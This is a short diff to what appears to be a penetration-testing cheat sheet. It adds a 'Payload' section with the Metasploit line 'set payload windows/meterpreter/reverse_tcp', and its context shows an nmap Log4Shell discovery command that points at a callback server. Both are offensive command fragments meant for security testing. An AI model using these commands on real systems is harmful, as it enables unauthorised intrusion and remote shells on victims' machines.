@@ -292,6 +292,12 @@ nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:
 
 > Log4J Discovery script
 
+
+#### Payload:
+```shell
+set payload windows/meterpreter/reverse_tcp
+```
+
 #### TCP Commands:
 
 ```Shell
